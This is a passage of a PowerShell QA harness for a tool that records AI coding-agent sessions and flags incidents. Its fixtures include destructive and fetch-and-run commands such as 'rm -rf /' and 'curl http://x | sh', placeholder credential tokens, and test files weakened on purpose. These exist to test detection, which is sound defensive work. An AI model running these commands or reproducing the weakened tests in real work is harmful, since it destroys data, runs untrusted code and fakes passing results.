# Flightstrip engine checks.
#
# Every check runs against target\release\flightstrip.exe inside a throwaway
# git repo under $env:TEMP. Nothing here touches the project working tree.
#
# Called by scripts\qa.ps1. Writes <WorkRoot>\engine-results.json and prints the
# same table, so the driver can merge the rows into one report.
#
#   powershell -ExecutionPolicy Bypass -File scripts\qa-engine.ps1 -Exe <path> -WorkRoot <dir>

param(
    [Parameter(Mandatory = $true)][string]$Exe,
    [Parameter(Mandatory = $true)][string]$WorkRoot
)

$ErrorActionPreference = 'Continue'

$Exe = (Resolve-Path -LiteralPath $Exe).Path
$script:Rows = New-Object System.Collections.Generic.List[object]
$script:Log  = New-Object System.Collections.Generic.List[string]

# ── plumbing ────────────────────────────────────────────────────────────────

function Add-Row {
    param([string]$Id, [string]$Check, [bool]$Ok, [string]$Detail)
    $script:Rows.Add([pscustomobject]@{
        Id = $Id; Check = $Check; Result = $(if ($Ok) { 'PASS' } else { 'FAIL' }); Detail = $Detail
    })
    $colour = if ($Ok) { 'DarkGreen' } else { 'Red' }
    Write-Host ("[{0}] {1,-4} {2,-46} {3}" -f $(if ($Ok) { 'PASS' } else { 'FAIL' }), $Id, $Check, $Detail) -ForegroundColor $colour
}

function Add-Skip {
    param([string]$Id, [string]$Check, [string]$Why)
    $script:Rows.Add([pscustomobject]@{ Id = $Id; Check = $Check; Result = 'SKIP'; Detail = $Why })
    Write-Host ("[SKIP] {0,-4} {1,-46} {2}" -f $Id, $Check, $Why) -ForegroundColor DarkYellow
}

function New-Repo {
    param([string]$Name)
    $path = Join-Path $WorkRoot ("repos\" + $Name)
    if (Test-Path -LiteralPath $path) { Remove-Item -LiteralPath $path -Recurse -Force }
    New-Item -ItemType Directory -Path $path -Force | Out-Null
    Push-Location -LiteralPath $path
    git init -q 2>&1 | Out-Null
    git config user.email 'qa@flightstrip.local'
    git config user.name  'Flightstrip QA'
    Set-Content -LiteralPath '.gitignore' -Value @('.flightstrip/', 'node_modules/', 'target/') -Encoding utf8
    Set-Content -LiteralPath 'README.md'   -Value "# $Name" -Encoding utf8
    git add -A 2>&1 | Out-Null
    git commit -qm 'seed' 2>&1 | Out-Null
    Pop-Location
    return $path
}

# Windows PowerShell 5.1's `-Encoding utf8` writes a BOM, and a BOM makes the
# first line of events.jsonl unparseable. Every file this harness fabricates or
# compares goes through here instead.
function Write-Text {
    param([string]$Path, [string]$Text)
    $dir = Split-Path -Parent $Path
    if ($dir -and -not (Test-Path -LiteralPath $dir)) {
        New-Item -ItemType Directory -Path $dir -Force | Out-Null
    }
    [System.IO.File]::WriteAllText($Path, $Text, (New-Object System.Text.UTF8Encoding($false)))
}

# Runs the CLI in a repo. Returns @{ Code; Out }.
function FS {
    param([string]$Repo, [string[]]$Arguments)
    $cwd = (Get-Location).Path
    try {
        Set-Location -LiteralPath $Repo
        $out = (& $Exe @Arguments 2>&1 | Out-String)
        return @{ Code = $LASTEXITCODE; Out = $out }
    }
    finally { Set-Location -LiteralPath $cwd }
}

function Start-Recorder {
    param([string]$Repo, [string]$Tag)
    $stdout = Join-Path $WorkRoot "$Tag.out.log"
    $stderr = Join-Path $WorkRoot "$Tag.err.log"
    $proc = Start-Process -FilePath $Exe `
        -ArgumentList @('watch', '--title', $Tag, '--agent', 'qa-harness', '--interval', '120') `
        -WorkingDirectory $Repo -PassThru -WindowStyle Hidden `
        -RedirectStandardOutput $stdout -RedirectStandardError $stderr
    # Wait for the active pointer: the recorder writes it before it starts polling.
    $deadline = (Get-Date).AddSeconds(10)
    while ((Get-Date) -lt $deadline) {
        if (Test-Path -LiteralPath (Join-Path $Repo '.flightstrip\active')) { break }
        Start-Sleep -Milliseconds 100
    }
    return $proc
}

function Stop-Recorder {
    param($Process)
    if ($Process -and -not $Process.HasExited) {
        Stop-Process -Id $Process.Id -Force
        $Process.WaitForExit(5000) | Out-Null
    }
    Start-Sleep -Milliseconds 150
}

function Settle { param([int]$Ms = 700) Start-Sleep -Milliseconds $Ms }

function Get-Events {
    param([string]$Repo)
    $dir = Get-ChildItem -LiteralPath (Join-Path $Repo '.flightstrip\sessions') -Directory |
        Sort-Object LastWriteTime -Descending | Select-Object -First 1
    if (-not $dir) { return @() }
    $file = Join-Path $dir.FullName 'events.jsonl'
    if (-not (Test-Path -LiteralPath $file)) { return @() }
    return @(Get-Content -LiteralPath $file | Where-Object { $_.Trim() } | ForEach-Object { $_ | ConvertFrom-Json })
}

function Get-LatestSessionDir {
    param([string]$Repo)
    Get-ChildItem -LiteralPath (Join-Path $Repo '.flightstrip\sessions') -Directory |
        Sort-Object LastWriteTime -Descending | Select-Object -First 1
}

# A tiny node test file so `node --test` emits real, parseable output.
function Write-NodeTest {
    param([string]$Repo, [string]$Path, [string]$Body)
    Write-Text -Path (Join-Path $Repo $Path) -Text $Body
}

$nodeAssert = @'
import test from 'node:test';
import assert from 'node:assert';
import { retries } from './src/upload.js';

test('retries twice', () => {
  assert.equal(retries, 2);
});

test('drains the queue', async () => {
  assert.equal(1 + 1, 2);
});
'@

# ── E1: session lifecycle ───────────────────────────────────────────────────

$repo = New-Repo 'e1-lifecycle'
New-Item -ItemType Directory -Path (Join-Path $repo 'src') -Force | Out-Null
Write-Text -Path (Join-Path $repo 'src\upload.js') -Text "export const retries = 1;`n"
$proc = Start-Recorder -Repo $repo -Tag 'e1'
Settle 400
FS $repo @('mark', 'add a retry to the uploader') | Out-Null
Settle 300
Write-Text -Path (Join-Path $repo 'src\upload.js') -Text "export const retries = 2;`n"
Settle 900
FS $repo @('exec', '--', 'cmd', '/c', 'exit 1') | Out-Null
Settle 500
# A command that is recognisably a test command but prints no summary must fall
# back to one anonymous result (README, "Test parsing is guesswork").
FS $repo @('exec', '--', 'node', '-e', 'process.exit(1)', 'test') | Out-Null
Settle 500
$activeBefore = Test-Path -LiteralPath (Join-Path $repo '.flightstrip\active')
Stop-Recorder $proc

$events = Get-Events $repo
$kinds  = $events | ForEach-Object { $_.kind }
$hasStart = $kinds -contains 'session_start'
$hasPrompt = $kinds -contains 'prompt'
$hasChange = $kinds -contains 'file_change'
$hasCommand = $kinds -contains 'command'
Add-Row 'E1a' 'recorder: session_start, prompt, file_change, command' `
    ($hasStart -and $hasPrompt -and $hasChange -and $hasCommand) `
    ("start={0} prompt={1} change={2} command={3} total={4}" -f $hasStart, $hasPrompt, $hasChange, $hasCommand, $events.Count)

# `exec -- cmd /c exit 1` is not a test command, so it records a command, not a
# test run: testparse::parse returns None unless the command looks like a suite.
$exitCmd = @($events | Where-Object { $_.kind -eq 'command' -and $_.cmd -like '*exit 1*' })
$exitTests = @($events | Where-Object { $_.kind -eq 'test_run' -and $_.cmd -like '*exit 1*' })
Add-Row 'E1b' 'a non-test command records command, not test_run' ($exitCmd.Count -eq 1 -and $exitTests.Count -eq 0) `
    ("command events for `cmd /c exit 1`: {0}, test_runs for it: {1}" -f $exitCmd.Count, $exitTests.Count)

$fallback = @($events | Where-Object { $_.kind -eq 'test_run' -and $_.total -eq 1 })
Add-Row 'E1c' 'opaque test command falls back to one anonymous result' ($fallback.Count -eq 1 -and $fallback[0].ok -eq $false) `
    $(if ($fallback.Count) { "total=$($fallback[0].total) passed=$($fallback[0].passed) failed=$($fallback[0].failed)" } else { 'no anonymous test_run recorded' })

$stale = Test-Path -LiteralPath (Join-Path $repo '.flightstrip\active')
Add-Row 'E1d' 'hard kill leaves a stale active pointer' $stale `
    $(if ($stale) { 'pointer kept: cleanup runs only on the Ctrl+C path' } else { 'pointer already gone' })

# The next run must recover from it rather than refusing to start.
$recover = Start-Recorder -Repo $repo -Tag 'e1-recover'
Settle 600
Stop-Recorder $recover
$recErr = if (Test-Path -LiteralPath (Join-Path $WorkRoot 'e1-recover.err.log')) { Get-Content -LiteralPath (Join-Path $WorkRoot 'e1-recover.err.log') -Raw } else { '' }
Add-Row 'E1e' 'stale pointer is cleared by the next watch' ($recErr -match 'cleared a stale session pointer') `
    $(if ($recErr -match 'stale') { 'warned and cleared' } else { 'no stale-pointer warning seen' })

Add-Skip 'E1f' 'Ctrl+C closes the session and removes active' 'cannot deliver CTRL_C_EVENT to a child from PowerShell; covered by the crate test `stopping_the_recorder_closes_the_session_and_clears_active` (cargo test) and by the manual checklist'

# ── E2: prompt_id attribution ───────────────────────────────────────────────

$attributed = @($events | Where-Object { $_.kind -in @('file_change', 'command') -and $_.prompt_id })
$unattributed = @($events | Where-Object { $_.kind -in @('file_change', 'command') -and -not $_.prompt_id })
Add-Row 'E2' 'file_change and command carry prompt_id after mark' `
    ($attributed.Count -gt 0 -and $unattributed.Count -eq 0) `
    ("attributed={0} unattributed={1}" -f $attributed.Count, $unattributed.Count)

# ── E3-E8: change detection semantics ──────────────────────────────────────

$repo = New-Repo 'e3-detection'
New-Item -ItemType Directory -Path (Join-Path $repo 'src\deep nested') -Force | Out-Null
Write-Text -Path (Join-Path $repo 'src\deep nested\with space.js') -Text "const a = 1;`n"
Write-Text -Path (Join-Path $repo 'crlf.txt') -Text "one`ntwo`n"
Write-Text -Path (Join-Path $repo 'atomic.txt') -Text "before`n"
git -C $repo add -A 2>&1 | Out-Null
git -C $repo commit -qm more 2>&1 | Out-Null

$proc = Start-Recorder -Repo $repo -Tag 'e3'
Settle 1500

# E3: CRLF-only rewrite must produce no event. A "no event" result is only
# meaningful if the watcher is alive, so E6 later changes another file and that
# event has to appear; the check below waits for the recorder to go quiet first.
[System.IO.File]::WriteAllText((Join-Path $repo 'crlf.txt'), "one`r`ntwo`r`n")
Settle 2000
$afterCrlf = @(Get-Events $repo | Where-Object { $_.kind -eq 'file_change' -and $_.path -eq 'crlf.txt' })
Add-Row 'E3' 'CRLF-only rewrite produces no event' ($afterCrlf.Count -eq 0) "file_change events for crlf.txt: $($afterCrlf.Count)"

# E4: metadata-only touch must produce no event.
$stamp = (Get-Item -LiteralPath (Join-Path $repo 'atomic.txt')).LastWriteTime
(Get-Item -LiteralPath (Join-Path $repo 'atomic.txt')).LastWriteTime = $stamp.AddMinutes(5)
Settle 1200
$afterTouch = @(Get-Events $repo | Where-Object { $_.kind -eq 'file_change' -and $_.path -eq 'atomic.txt' })
Add-Row 'E4' 'metadata-only touch produces no event' ($afterTouch.Count -eq 0) "file_change events for atomic.txt: $($afterTouch.Count)"

# E5: atomic save (temp write + rename over) is one modify, never create+delete.
Write-Text -Path (Join-Path $repo 'atomic.txt.tmp') -Text "after`n"
Move-Item -LiteralPath (Join-Path $repo 'atomic.txt.tmp') -Destination (Join-Path $repo 'atomic.txt') -Force
Settle 1200
$atomic = @(Get-Events $repo | Where-Object { $_.path -eq 'atomic.txt' -or $_.path -eq 'atomic.txt.tmp' })
$atomicOps = ($atomic | ForEach-Object { $_.op }) -join ','
Add-Row 'E5' 'atomic save is one modify, no delete' ($atomic.Count -eq 1 -and $atomicOps -eq 'modify') "events=$($atomic.Count) ops=[$atomicOps]"

# E6: paths with spaces and nested dirs, forward slashes, repo-relative.
Write-Text -Path (Join-Path $repo 'src\deep nested\with space.js') -Text "const a = 2;`n"
Settle 1200
$spaced = @(Get-Events $repo | Where-Object { $_.kind -eq 'file_change' -and $_.path -like '*with space*' })
$pathOk = ($spaced.Count -ge 1) -and ($spaced[0].path -eq 'src/deep nested/with space.js')
Add-Row 'E6' 'space + nested path is repo-relative, forward slashes' $pathOk "path=[$($spaced[0].path)]"

# E7: built-in and configured ignores.
New-Item -ItemType Directory -Path (Join-Path $repo 'node_modules\pkg'), (Join-Path $repo 'target'), (Join-Path $repo '.flightstrip\junk') -Force | Out-Null
Set-Content -LiteralPath (Join-Path $repo 'node_modules\pkg\index.js') -Value 'x' -Encoding utf8
Set-Content -LiteralPath (Join-Path $repo 'target\out.bin') -Value 'x' -Encoding utf8
Set-Content -LiteralPath (Join-Path $repo '.flightstrip\junk\j.txt') -Value 'x' -Encoding utf8
Settle 900
$ignored = @(Get-Events $repo | Where-Object { $_.kind -eq 'file_change' -and ($_.path -like 'node_modules/*' -or $_.path -like 'target/*' -or $_.path -like '.flightstrip/*') })
Add-Row 'E7' 'node_modules, target, .flightstrip ignored' ($ignored.Count -eq 0) "ignored-path events: $($ignored.Count)"

# E8: binary and 2 MB files are recorded without content and do not crash.
$bytes = New-Object byte[] 2048
for ($i = 0; $i -lt $bytes.Length; $i++) { $bytes[$i] = $i % 256 }
[System.IO.File]::WriteAllBytes((Join-Path $repo 'image.png'), $bytes)
$big = New-Object byte[] (2 * 1024 * 1024)
for ($i = 0; $i -lt $big.Length; $i++) { $big[$i] = 65 + ($i % 26) }
[System.IO.File]::WriteAllBytes((Join-Path $repo 'big.txt'), $big)
Settle 1500
$binEvents = @(Get-Events $repo | Where-Object { $_.path -in @('image.png', 'big.txt') })
$alive = -not $proc.HasExited
Add-Row 'E8' 'binary + 2 MB file recorded, recorder survives' ($binEvents.Count -ge 2 -and $alive) `
    ("events={0} recorder_alive={1}" -f $binEvents.Count, $alive)
Stop-Recorder $proc

# ── E9-E11: detectors that need real diffs ─────────────────────────────────

$repo = New-Repo 'e9-detectors'
Write-NodeTest $repo 'src/upload.js' "export const retries = 1;`n"
Write-NodeTest $repo 'test/upload.test.mjs' $nodeAssert
git -C $repo add -A 2>&1 | Out-Null; git -C $repo commit -qm src 2>&1 | Out-Null

$proc = Start-Recorder -Repo $repo -Tag 'e9'
Settle 800
FS $repo @('mark', 'make the failing test pass') | Out-Null
Settle 300

# weaken: delete an assertion and skip a whole test
$weakened = @'
import test from 'node:test';
import assert from 'node:assert';
import { retries } from './src/upload.js';

test('retries twice', () => {
});

test.skip('drains the queue', async () => {
  assert.equal(1 + 1, 2);
});
'@
Write-NodeTest $repo 'test/upload.test.mjs' $weakened
Settle 1200
FS $repo @('exec', '--', 'node', '--test') | Out-Null
Settle 800
Stop-Recorder $proc

$exp = FS $repo @('export', '--out', 'session.json')
$json = if (Test-Path -LiteralPath (Join-Path $repo 'session.json')) { Get-Content -LiteralPath (Join-Path $repo 'session.json') -Raw | ConvertFrom-Json } else { $null }
# `@(if (...) { ... })` keeps an empty result an empty array; assigning an
# `if` that yields nothing gives $null and every `.Count` comparison then lies.
$weakInc = @(if ($json) { $json.incidents | Where-Object { $_.kind -eq 'test_weakened' } })
$weakEvidence = ($weakInc | ForEach-Object { $_.evidence }) -join ' / '
Add-Row 'E9' 'test_weakened fires on removed assertion + .skip' `
    ($weakInc.Count -ge 1 -and ($weakInc | Where-Object { $_.severity -eq 'critical' })) `
    ("incidents={0} evidence=[{1}]" -f $weakInc.Count, $weakEvidence.Substring(0, [Math]::Min(90, $weakEvidence.Length)))

# A moved assertion must not fire.
$repo = New-Repo 'e9b-moved'
Write-NodeTest $repo 'test/keep.test.mjs' @'
import test from 'node:test';
import assert from 'node:assert';

test('keeps its assertion', () => {
  const value = 2;
  assert.equal(value, 2);
});
'@
git -C $repo add -A 2>&1 | Out-Null; git -C $repo commit -qm seed 2>&1 | Out-Null
$proc = Start-Recorder -Repo $repo -Tag 'e9b'
Settle 800
FS $repo @('mark', 'split the test in two') | Out-Null
Write-NodeTest $repo 'test/keep.test.mjs' @'
import test from 'node:test';
import assert from 'node:assert';

test('keeps its assertion', () => {
  const value = 2;
});

test('still keeps it', () => {
  const value = 2;
  assert.equal(value, 2);
});
'@
Settle 1200
Stop-Recorder $proc
FS $repo @('export', '--out', 'session.json') | Out-Null
$json = if (Test-Path -LiteralPath (Join-Path $repo 'session.json')) { Get-Content -LiteralPath (Join-Path $repo 'session.json') -Raw | ConvertFrom-Json } else { $null }
$movedInc = @(if ($json) { $json.incidents | Where-Object { $_.kind -eq 'test_weakened' } })
Add-Row 'E9b' 'a moved assertion does not fire test_weakened' ($movedInc.Count -eq 0) "incidents=$($movedInc.Count)"

# Rewriting an assertion is not the same as moving it: the old line is gone and
# the new one asserts something else, so the rule fires and names the old line.
$repo = New-Repo 'e9c-rewrite'
Write-NodeTest $repo 'test/keep.test.mjs' @'
import test from 'node:test';
import assert from 'node:assert';

test('keeps its assertion', () => {
  const value = 2;
  assert.equal(value, 2);
});
'@
git -C $repo add -A 2>&1 | Out-Null; git -C $repo commit -qm seed 2>&1 | Out-Null
$proc = Start-Recorder -Repo $repo -Tag 'e9c'
Settle 800
FS $repo @('mark', 'loosen the check') | Out-Null
Write-NodeTest $repo 'test/keep.test.mjs' @'
import test from 'node:test';
import assert from 'node:assert';

test('keeps its assertion', () => {
  const expected = 2;
  assert.equal(expected, expected);
});
'@
Settle 1200
Stop-Recorder $proc
FS $repo @('export', '--out', 'session.json') | Out-Null
$json = if (Test-Path -LiteralPath (Join-Path $repo 'session.json')) { Get-Content -LiteralPath (Join-Path $repo 'session.json') -Raw | ConvertFrom-Json } else { $null }
$rewriteInc = @(if ($json) { $json.incidents | Where-Object { $_.kind -eq 'test_weakened' } })
Add-Row 'E9c' 'a rewritten assertion fires, naming the old line' ($rewriteInc.Count -ge 1) `
    $(if ($rewriteInc.Count) { "evidence=[$($rewriteInc[0].evidence)]" } else { 'no incident' })

# ── E10: regression ────────────────────────────────────────────────────────

$repo = New-Repo 'e10-regression'
Write-NodeTest $repo 'src/math.js' "export const add = (a, b) => a + b;`n"
Write-NodeTest $repo 'test/math.test.mjs' @'
import test from 'node:test';
import assert from 'node:assert';
import { add } from '../src/math.js';

test('adds', () => {
  assert.equal(add(2, 2), 4);
});
'@
git -C $repo add -A 2>&1 | Out-Null; git -C $repo commit -qm seed 2>&1 | Out-Null
$proc = Start-Recorder -Repo $repo -Tag 'e10'
Settle 800
FS $repo @('mark', 'speed up the helper') | Out-Null
FS $repo @('exec', '--', 'node', '--test') | Out-Null
Settle 500
Write-NodeTest $repo 'src/math.js' "export const add = (a, b) => a + b + 1;`n"
Settle 1200
FS $repo @('exec', '--', 'node', '--test') | Out-Null
Settle 800
Stop-Recorder $proc
FS $repo @('export', '--out', 'session.json') | Out-Null
$json = if (Test-Path -LiteralPath (Join-Path $repo 'session.json')) { Get-Content -LiteralPath (Join-Path $repo 'session.json') -Raw | ConvertFrom-Json } else { $null }
$runs = @(if ($json) { $json.steps | Where-Object { $_.kind -eq 'test_run' } })
$reg  = @(if ($json) { $json.incidents | Where-Object { $_.kind -eq 'test_regression' } })
Add-Row 'E10' 'test_regression fires on ok then not ok' `
    ($reg.Count -ge 1 -and $runs.Count -ge 2) `
    ("test_runs={0} first_ok={1} last_ok={2} regression_incidents={3}" -f $runs.Count, $json.stats.tests_first_ok, $json.stats.tests_last_ok, $reg.Count)

# ── E11: thrashing ─────────────────────────────────────────────────────────

$repo = New-Repo 'e11-thrash'
Set-Content -LiteralPath (Join-Path $repo 'handler.js') -Value "let v = 0;`n" -Encoding utf8
git -C $repo add -A 2>&1 | Out-Null; git -C $repo commit -qm seed 2>&1 | Out-Null
$proc = Start-Recorder -Repo $repo -Tag 'e11'
Settle 800
FS $repo @('mark', 'wire the handler') | Out-Null
for ($i = 1; $i -le 6; $i++) {
    Set-Content -LiteralPath (Join-Path $repo 'handler.js') -Value "let v = $i;`n" -Encoding utf8
    Settle 700
}
Settle 600
Stop-Recorder $proc
FS $repo @('export', '--out', 'session.json') | Out-Null
$json = if (Test-Path -LiteralPath (Join-Path $repo 'session.json')) { Get-Content -LiteralPath (Join-Path $repo 'session.json') -Raw | ConvertFrom-Json } else { $null }
$thrash = @(if ($json) { $json.incidents | Where-Object { $_.kind -eq 'thrashing' } })
Add-Row 'E11' 'six rewrites in one prompt fire thrashing' ($thrash.Count -ge 1) `
    ("incidents={0} severity={1}" -f $thrash.Count, ($thrash | ForEach-Object { $_.severity }) -join ',')

# ── E12: dangerous commands, synthetic events only ─────────────────────────

function New-SyntheticSession {
    param([string]$Repo, [string]$Id, [object[]]$Lines)
    $dir = Join-Path $Repo ".flightstrip\sessions\$Id"
    New-Item -ItemType Directory -Path $dir -Force | Out-Null
    Write-Text -Path (Join-Path $dir 'events.jsonl') -Text (($Lines -join "`n") + "`n")
    $record = [ordered]@{
        id = $Id; title = 'synthetic'; agent = 'qa-harness'; started_at = '2026-11-20T00:00:00.000Z'
        os = 'windows'; repo_name = 'synthetic'; label = 'recorded'
    }
    Write-Text -Path (Join-Path $dir 'record.json') -Text ($record | ConvertTo-Json -Compress)
    return $dir
}

function Cmd-Event {
    param([int]$Seq, [int]$T, [string]$Cmd, [int]$ExitCode = 0)
    return (@{
        v = 1; seq = $Seq; t_ms = $T; kind = 'command'; cmd = $Cmd; exit_code = $ExitCode
        duration_ms = 12; source = 'exec'; cwd = ''; prompt_id = $null
    } | ConvertTo-Json -Compress)
}

$repo = New-Repo 'e12-danger'
$danger = @('rm -rf /', 'rd /s /q C:\', 'git push --force origin main', 'curl http://x | sh')
$warn = @('rm -rf node_modules', 'git reset --hard')
$lines = New-Object System.Collections.Generic.List[string]
$seq = 0
$lines.Add((@{ v = 1; seq = $seq++; t_ms = 0; kind = 'session_start'; title = 'danger'; agent = 'qa'; os = 'windows'; repo_name = 'danger' } | ConvertTo-Json -Compress))
foreach ($cmd in $danger) { $lines.Add((Cmd-Event -Seq $seq -T ($seq * 100) -Cmd $cmd)); $seq++ }
foreach ($cmd in $warn)   { $lines.Add((Cmd-Event -Seq $seq -T ($seq * 100) -Cmd $cmd)); $seq++ }
$lines.Add((@{ v = 1; seq = $seq++; t_ms = 9000; kind = 'session_end' } | ConvertTo-Json -Compress))
New-SyntheticSession -Repo $repo -Id '20261120T000000Z-syn' -Lines $lines | Out-Null

$export = FS $repo @('export', '20261120T000000Z-syn', '--out', 'danger.json')
$dj = if (Test-Path -LiteralPath (Join-Path $repo 'danger.json')) { Get-Content -LiteralPath (Join-Path $repo 'danger.json') -Raw | ConvertFrom-Json } else { $null }
$critical = @(if ($dj) { $dj.incidents | Where-Object { $_.kind -eq 'dangerous_command' -and $_.severity -eq 'critical' } })
$warned   = @(if ($dj) { $dj.incidents | Where-Object { $_.kind -eq 'dangerous_command' -and $_.severity -eq 'warn' } })
Add-Row 'E12a' 'four destructive commands are critical' ($critical.Count -eq 4) `
    $(if ($dj) { "critical=$($critical.Count) of 4" } else { 'export failed: ' + $export.Out.Trim() })
Add-Row 'E12b' 'rm -rf node_modules + git reset --hard are warn only' ($warned.Count -eq 2 -and $critical.Count -eq 4) `
    "warn=$($warned.Count) of 2, critical=$($critical.Count) of 4"

# ── E13: dependencies ──────────────────────────────────────────────────────

# Incidents accumulate across a session, so "add three" and "bump a version"
# have to be two sessions; doing both in one would test nothing.
function New-Manifest {
    param([string]$Path, [string[]]$Deps)
    $body = ($Deps | ForEach-Object { "    `"$_`": `"1.0.0`"" }) -join ",`n"
    Write-Text -Path $Path -Text ("{`n  `"name`": `"x`",`n  `"version`": `"1.0.0`",`n  `"dependencies`": {`n$body`n  }`n}`n")
}

$repo = New-Repo 'e13-deps'
New-Manifest -Path (Join-Path $repo 'package.json') -Deps @('left-pad')
git -C $repo add -A 2>&1 | Out-Null; git -C $repo commit -qm seed 2>&1 | Out-Null
$proc = Start-Recorder -Repo $repo -Tag 'e13'
Settle 800
FS $repo @('mark', 'add three packages') | Out-Null
New-Manifest -Path (Join-Path $repo 'package.json') -Deps @('left-pad', 'alpha', 'beta', 'gamma')
Settle 1200
Stop-Recorder $proc
FS $repo @('export', '--out', 'session.json') | Out-Null
$json = if (Test-Path -LiteralPath (Join-Path $repo 'session.json')) { Get-Content -LiteralPath (Join-Path $repo 'session.json') -Raw | ConvertFrom-Json } else { $null }
$dep = @(if ($json) { $json.incidents | Where-Object { $_.kind -eq 'dependency_added' } })
Add-Row 'E13a' 'three deps added fire dependency_added at warn' `
    ($dep.Count -ge 1 -and @($dep | Where-Object { $_.severity -eq 'warn' }).Count -ge 1) `
    ("incidents={0} severities=[{1}] evidence=[{2}]" -f $dep.Count, (($dep | ForEach-Object { $_.severity }) -join ','), (($dep | ForEach-Object { $_.evidence }) -join ' '))

$repo = New-Repo 'e13b-bump'
New-Manifest -Path (Join-Path $repo 'package.json') -Deps @('left-pad', 'alpha')
git -C $repo add -A 2>&1 | Out-Null; git -C $repo commit -qm seed 2>&1 | Out-Null
$proc = Start-Recorder -Repo $repo -Tag 'e13b'
Settle 800
FS $repo @('mark', 'bump the pins') | Out-Null
Write-Text -Path (Join-Path $repo 'package.json') -Text "{`n  `"name`": `"x`",`n  `"version`": `"1.1.0`",`n  `"dependencies`": {`n    `"left-pad`": `"1.4.0`",`n    `"alpha`": `"1.0.1`"`n  }`n}`n"
Settle 1200
Stop-Recorder $proc
FS $repo @('export', '--out', 'session.json') | Out-Null
$json2 = if (Test-Path -LiteralPath (Join-Path $repo 'session.json')) { Get-Content -LiteralPath (Join-Path $repo 'session.json') -Raw | ConvertFrom-Json } else { $null }
$dep2 = @(if ($json2) { $json2.incidents | Where-Object { $_.kind -eq 'dependency_added' } })
Add-Row 'E13b' 'a version bump alone fires nothing' ($dep2.Count -eq 0) "incidents=$($dep2.Count) steps=$($json2.steps.Count)"

# ── E14: secrets ───────────────────────────────────────────────────────────

$secrets = @(
    'sk-test1234567890abcdefghijklmnop',
    'ghp_abcdefghijklmnopqrstuvwxyz0123456789',
    'AKIAIOSFODNN7EXAMPLE',
    'eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U'
)
$repo = New-Repo 'e14-secrets'
Write-Text -Path (Join-Path $repo 'config.js') -Text "export const key = '';`n"
git -C $repo add -A 2>&1 | Out-Null; git -C $repo commit -qm seed 2>&1 | Out-Null
$proc = Start-Recorder -Repo $repo -Tag 'e14'
Settle 800
FS $repo @('mark', ("use this token " + $secrets[0])) | Out-Null
Write-Text -Path (Join-Path $repo 'config.js') -Text ("export const key = '" + $secrets[1] + "';`n")
Settle 1000
Write-Text -Path (Join-Path $repo '.env') -Text ("STRIPE=" + $secrets[2] + "`nJWT=" + $secrets[3] + "`n")
Settle 1000
FS $repo @('exec', '--', 'cmd', '/c', 'echo', $secrets[3]) | Out-Null
Settle 800
Stop-Recorder $proc

FS $repo @('export', '--out', 'raw.json') | Out-Null
FS $repo @('export', '--redact', '--out', 'redacted.json') | Out-Null
$rawText = if (Test-Path -LiteralPath (Join-Path $repo 'raw.json')) { Get-Content -LiteralPath (Join-Path $repo 'raw.json') -Raw } else { '' }
$redactedText = if (Test-Path -LiteralPath (Join-Path $repo 'redacted.json')) { Get-Content -LiteralPath (Join-Path $repo 'redacted.json') -Raw } else { '' }
$rawJson = if ($rawText) { $rawText | ConvertFrom-Json } else { $null }
$secretInc = @(if ($rawJson) { $rawJson.incidents | Where-Object { $_.kind -eq 'secret_touched' } })
Add-Row 'E14a' 'secret_touched fires and is critical' `
    ($secretInc.Count -ge 1 -and @($secretInc | Where-Object { $_.severity -eq 'critical' }).Count -ge 1) `
    ("incidents={0} evidence=[{1}]" -f $secretInc.Count, $(if ($secretInc.Count) { $secretInc[0].evidence } else { '' }))

$leakedRaw = @($secrets | Where-Object { $rawText.Contains($_) })
Add-Row 'E14b' 'without --redact the raw values are present (documented)' ($leakedRaw.Count -gt 0) `
    "raw export contains $($leakedRaw.Count) of 4 values"

$leakedRedacted = @($secrets | Where-Object { $redactedText.Contains($_) })
Add-Row 'E14c' 'with --redact none of the four values survive' ($leakedRedacted.Count -eq 0) `
    "redacted export contains $($leakedRedacted.Count) of 4 values"

$envBodies = @('sk-test', 'ghp_', 'AKIA')
$envLeak = @($envBodies | Where-Object { $redactedText.Contains($_) })
Add-Row 'E14d' 'no .env contents in the redacted export' ($envLeak.Count -eq 0) "needles found: $($envLeak.Count)"

# ── E15: a clean session has no incidents ─────────────────────────────────

$repo = New-Repo 'e15-clean'
Write-NodeTest $repo 'src/util.js' "export const clamp = (n) => Math.min(1, Math.max(0, n));`n"
Write-NodeTest $repo 'test/util.test.mjs' @'
import test from 'node:test';
import assert from 'node:assert';
import { clamp } from '../src/util.js';

test('clamps', () => {
  assert.equal(clamp(5), 1);
});
'@
git -C $repo add -A 2>&1 | Out-Null; git -C $repo commit -qm seed 2>&1 | Out-Null
$proc = Start-Recorder -Repo $repo -Tag 'e15'
Settle 800
FS $repo @('mark', 'add a clamp helper with a test') | Out-Null
FS $repo @('exec', '--', 'node', '--test') | Out-Null
Settle 800
Write-NodeTest $repo 'src/util.js' "export const clamp = (n, hi = 1) => Math.min(hi, Math.max(0, n));`n"
Settle 1000
FS $repo @('exec', '--', 'node', '--test') | Out-Null
Settle 800
Stop-Recorder $proc
FS $repo @('export', '--out', 'session.json') | Out-Null
$json = if (Test-Path -LiteralPath (Join-Path $repo 'session.json')) { Get-Content -LiteralPath (Join-Path $repo 'session.json') -Raw | ConvertFrom-Json } else { $null }
Add-Row 'E15' 'clean session: zero incidents' ($json -and $json.incidents.Count -eq 0) `
    $(if ($json) { "incidents=$($json.incidents.Count) steps=$($json.steps.Count)" } else { 'no export' })

# ── E16: corrupt event logs ────────────────────────────────────────────────

$repo = New-Repo 'e16-corrupt'
$good = @(
    (@{ v = 1; seq = 0; t_ms = 0; kind = 'session_start'; title = 'c'; agent = $null; os = 'windows'; repo_name = 'c' } | ConvertTo-Json -Compress),
    (@{ v = 1; seq = 1; t_ms = 10; kind = 'prompt'; id = 'p-2'; text = 'go'; source = 'mark'; agent = $null } | ConvertTo-Json -Compress),
    (@{ v = 1; seq = 2; t_ms = 20; kind = 'command'; cmd = 'echo hi'; exit_code = 0; duration_ms = 1; source = 'exec'; cwd = ''; prompt_id = 'p-2' } | ConvertTo-Json -Compress)
)
$variants = @{
    'badline'   = ($good + 'this is not json')
    'truncated' = ($good + '{"v":1,"seq":3,"t_ms":30,"kind":"file_cha')
    'no-end'    = $good
}
$results = @()
foreach ($name in $variants.Keys) {
    $id = "20261120T00000${name}".Replace('-', '') + 'Z-c'
    $dir = Join-Path $repo ".flightstrip\sessions\$id"
